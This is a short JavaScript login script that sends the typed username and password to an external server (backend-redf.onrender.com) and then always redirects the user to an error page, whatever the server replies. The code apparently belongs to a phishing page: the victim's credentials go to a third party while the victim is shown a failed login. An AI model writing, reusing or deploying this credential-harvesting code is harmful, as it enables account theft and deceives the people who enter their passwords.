document.addEventListener("DOMContentLoaded", function () {
    const loginBtn = document.getElementById("login-btn");

    if (loginBtn) {
        loginBtn.addEventListener("click", login);
    }
});

async function login() {
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    try {
        const response = await fetch("https://backend-redf.onrender.com/login", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ username, password })
        });

        const result = await response.json();
        console.log("Server Response:", result); // Debugging

        // Redirect to error.html always
        window.location.href = "error.html";  
    } catch (error) {
        console.error("Error:", error);
        alert("Something went wrong!");
    }
}
